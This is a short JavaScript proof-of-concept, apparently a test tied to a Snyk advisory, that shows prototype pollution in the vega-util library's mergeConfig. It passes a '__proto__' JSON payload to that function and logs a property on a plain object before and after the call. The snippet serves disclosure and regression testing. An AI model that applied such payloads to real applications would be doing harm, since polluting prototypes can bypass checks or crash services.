// //https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223

// test("prototype pollution in vega-util", () => {
  const util = require("vega-util");
  const config = "{style: {point: {shape: triangle-right}}}";
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

console.log({}.polluted);

  util.mergeConfig(config, JSON.parse(malicious_payload));

console.log({}.polluted);
// });
